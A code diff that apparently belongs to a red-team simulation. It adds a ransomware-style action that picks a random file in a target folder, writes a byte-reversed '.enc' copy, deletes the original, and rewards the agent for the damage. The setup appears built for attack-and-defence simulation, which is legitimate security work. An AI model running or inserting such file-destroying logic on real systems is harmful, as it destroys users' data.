@@ -162,6 +162,29 @@ class RedTeamer:
                     impact = 0
                     self.log_evolution("T1589_LURK", True) # Always successful to lurk
 
+                elif action == "T1486_ENCRYPT":
+                    # Ransomware: Encrypt a file!
+                    impact = 0
+                    try:
+                        targets = [f for f in os.listdir(TARGET_DIR) if not f.endswith('.enc')]
+                        if targets:
+                            target = random.choice(targets)
+                            target_path = os.path.join(TARGET_DIR, target)
+                            encrypted_path = target_path + ".enc"
+
+                            with open(target_path, 'rb') as f:
+                                data = f.read()
+
+                            # Simple "Encryption" (Reverse bytes)
+                            with open(encrypted_path, 'wb') as f:
+                                f.write(data[::-1])
+
+                            os.remove(target_path)
+                            impact = 10
+                            self.audit.log_event("RED", "ATTACK_RANSOMWARE", target_path)
+                    except: pass
+                    self.log_evolution("T1486_ENCRYPT", impact > 0)
+
                 # 4. REWARDS
                 reward = 0
                 if impact > 0: reward = R_IMPACT
